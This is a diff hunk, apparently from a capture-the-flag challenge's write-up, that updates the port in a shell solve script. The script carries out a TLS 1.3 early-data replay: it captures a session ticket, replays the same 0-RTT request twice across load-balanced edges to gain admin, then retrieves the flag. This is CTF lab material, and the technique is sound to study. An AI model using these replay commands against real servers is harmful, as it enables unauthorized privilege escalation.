@@ -80,16 +80,16 @@ printf 'GET /warm HTTP/1.1\r\nHost: lab\r\n\r\nGET /promote HTTP/1.1\r\nHost: la
 
 # 0) full handshake -> capture a ticket that advertises early_data
 { printf 'GET / HTTP/1.1\r\nHost: lab\r\n\r\n'; sleep 1; } \
-  | openssl s_client -connect CHALLENGE_HOST:443 -servername lab -tls1_3 -sess_out sess.pem
+  | openssl s_client -connect CHALLENGE_HOST:32002 -servername lab -tls1_3 -sess_out sess.pem
 
 # 1) replay the flight (edge A) -> step 1
-sleep 1 | openssl s_client -connect CHALLENGE_HOST:443 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin
+sleep 1 | openssl s_client -connect CHALLENGE_HOST:32002 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin
 # 2) replay the SAME flight (round-robin -> edge B, cold cache) -> step 2, admin
-sleep 1 | openssl s_client -connect CHALLENGE_HOST:443 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin
+sleep 1 | openssl s_client -connect CHALLENGE_HOST:32002 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin
 
 # 3) collect, same token
 { printf 'GET /flag HTTP/1.1\r\nHost: lab\r\nX-Token: %s\r\n\r\n' "$TOK"; sleep 1; } \
-  | openssl s_client -connect CHALLENGE_HOST:443 -servername lab -tls1_3
+  | openssl s_client -connect CHALLENGE_HOST:32002 -servername lab -tls1_3
 ```
 
 `solve/solve.py` is this, wrapped in a retry loop (round-robin isn't something
